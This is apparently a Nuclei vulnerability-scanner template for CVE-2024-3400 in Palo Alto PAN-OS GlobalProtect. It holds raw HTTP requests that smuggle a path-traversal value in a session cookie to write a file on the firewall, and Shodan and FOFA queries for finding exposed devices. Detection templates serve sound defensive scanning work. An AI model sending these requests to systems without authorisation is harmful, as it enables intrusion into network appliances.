http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 404 && status_code_3 == 403
    - contains(body_2, 'invalid required input parameters')
    type: dsl
  matchers-condition: and
  raw:
  - 'GET /global-protect/portal/images/{{randstr}}.txt HTTP/1.1 HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /ssl-vpn/hipreport.esp HTTP/1.1

    Host: {{Hostname}}

    Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/{{randstr}}.txt;

    Content-Type: application/x-www-form-urlencoded


    user=global&portal=global&authcookie=e51140e4-4ee3-4ced-9373-96160d68&domain=global&computer=global&client-ip=global&client-ipv6=global&md5-sum=global&gwHipReportCheck=global

    '
  - 'GET /global-protect/portal/images/{{randstr}}.txt HTTP/1.1 HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-3400
info:
  author: salts,parthmalhotra
  classification:
    cpe: cpe:2.3:o:paloaltonetworks:pan-os:10.2.0:*:*:*:*:*:*:*
    cve-id: CVE-2024-3400
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
    epss-percentile: 0.72356
    epss-score: 0.00371
  description: 'A command injection vulnerability in the GlobalProtect feature of
    Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature
    configurations may enable an unauthenticated attacker to execute arbitrary code
    with root privileges on the firewall.Cloud NGFW, Panorama appliances, and Prisma
    Access are not impacted by this vulnerability.

    '
  metadata:
    fofa-query: icon_hash="-631559155"
    max-request: 1
    product: pan-os
    shodan-query: http.favicon.hash:-631559155
    vendor: paloaltonetworks
    verified: true
  name: GlobalProtect - OS Command Injection
  reference:
  - https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-CVE-2024-3400/
  - https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis
  - https://nvd.nist.gov/vuln/detail/CVE-2024-3400
  severity: critical
  tags: cve,cve2024,globalprotect,pan-os,rce,oast,kev
